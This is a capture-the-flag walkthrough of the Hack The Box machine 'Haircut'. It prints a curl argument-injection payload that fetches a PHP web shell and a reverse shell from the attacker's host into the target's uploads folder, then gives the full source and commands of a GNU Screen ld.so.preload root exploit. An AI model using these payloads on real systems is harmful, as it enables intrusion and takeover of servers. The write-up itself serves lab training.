
![logo](/logo.png)

# [Haircut- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 26 May 2017 as the eight machine on HTB,Haircut created by [r00tkie](https://app.hackthebox.com/users/462) without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *ssh
  
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/haircut 10.10.10.24
```

###### Output 

![](/Linux/Linux-Medium/Haircut/Screenshoots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/haircut 10.10.10.24                                                                                         ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 04:52 EAT
Nmap scan report for 10.10.10.24
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.78 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `ngix 1.10.0`. 

port[22]-http
port[80]-nginx

when we naviagate to [http://10.10.10.24](http://10.10.10.24)  we find a page with seem to be a haircut website

![](/Linux/Linux-Medium/Haircut/Screenshoots/haircut.png)

so lets do a `gobuster` so that we can enumerate active directory

```sh
gobuster dir --url http://10.10.10.24 --wordlist
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -t
50
```

![](/Linux/Linux-Medium/Haircut/Screenshoots/gobuster.png)

We find an `/uploads/` directory, as well as an `exposed.php` endpoint.Lets open the the php file 

![](/Linux/Linux-Medium/Haircut/Screenshoots/exposed.png)

The `exposed.php` endpoint accepts a URL and appears to send a request to it

# Exploitation

We set up a listener with netcat to inspect the raw request

```sh
nc -nlvp 8000
```

We then send a request to our machine's IP via the web application

```sh
http://10.10.14.70:8000
```

![](/Linux/Linux-Medium/Haircut/Screenshoots/test.png)

We can see the curl User-Agent header, indicating that the server likely uses the command-line
utility cURL to make the request. This opens up the target to command injection.
If our input is passed directly to the command, we might be able to append the -o flag to save
the curl output to a file. More specifically, since we can access the `/uploads/` directory on the
web server, we could upload a web shell there and obtain remote code execution.
We first write a PHP web shell into a file:

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

![](/Linux/Linux-Medium/Haircut/Screenshoots/shell.png)

Finally, we use the following payload to inject the flag and save the file to the uploads directory

```sh
http://10.10.14.15:8000/shell.php -o uploads/shell.php
```

so when we enter this and hit `Go` we can see that its pulling the shell that i just created

![](/Linux/Linux-Medium/Haircut/Screenshoots/http.png)

![](/Linux/Linux-Medium/Haircut/Screenshoots/upload.png)

when we access the shell from the upload folder we can be able to see that we can access `www`

![](/Linux/Linux-Medium/Haircut/Screenshoots/www.png)

We can leverage this to an interactive shell by using a pre-made [PHP reverse shell ](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)  script.We change the $ip and $port parameters and proceed to upload the script in the same fashion
as before.

so lets go and upload this interactive shell

```sh
http://10.10.14.15:8000/php-reverse-shell.php -o uploads/php-reverse-shell.php
```

we can see that the file has been uploaded so lets execute it to get shell

![](/Linux/Linux-Medium/Haircut/Screenshoots/exploit.png)

![](/Linux/Linux-Medium/Haircut/Screenshoots/revershell.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

we can now get the user flag

![](/Linux/Linux-Medium/Haircut/Screenshoots/user.png)

# Privillage Escalation

We run the `LinEnum`  to see what might be vulnerable 

![](/Linux/Linux-Medium/Haircut/Screenshoots/LinEnum.png)


![](/Linux/Linux-Medium/Haircut/Screenshoots/screen.png)

Researching this version leads us to [Exploit-DB](https://www.exploit-db.com/exploits/41154), where there is a public exploit for this tool.We will run the script's steps manually, to better understand the vulnerability and resolve any
errors that might arise. We will use /tmp for our exploit-related files

We start by creating the libhax.c file on the target machine, by running this command:

```sh
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
chown("/tmp/rootshell", 0, 0);
chmod("/tmp/rootshell", 04755);
unlink("/etc/ld.so.preload");
printf("[+] done!\n");
}
EOF
```

```sh
export PATH=/usr/bin:$PATH
```

ext, we try compiling it with gcc :

```sh
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

We re-run the gcc command, which results in a warning, but successfully compiles the shared
object

![](/Linux/Linux-Medium/Haircut/Screenshoots/libhax.png)

Next, we save the rootshell.c file:

```sh
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
setuid(0);
setgid(0);
seteuid(0);
setegid(0);
execvp("/bin/sh", NULL, NULL);
}
EOF
```

```sh
gcc -o /tmp/rootshell /tmp/rootshell.c
```

![](/Linux/Linux-Medium/Haircut/Screenshoots/rootshell.png)

```sh
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

After running the command sequence, we find ourselves in a shell as root :

![](/Linux/Linux-Medium/Haircut/Screenshoots/etc.png)

Then we get root `flag.txt`  

![](/Linux/Linux-Medium/Haircut/Screenshoots/root.png)


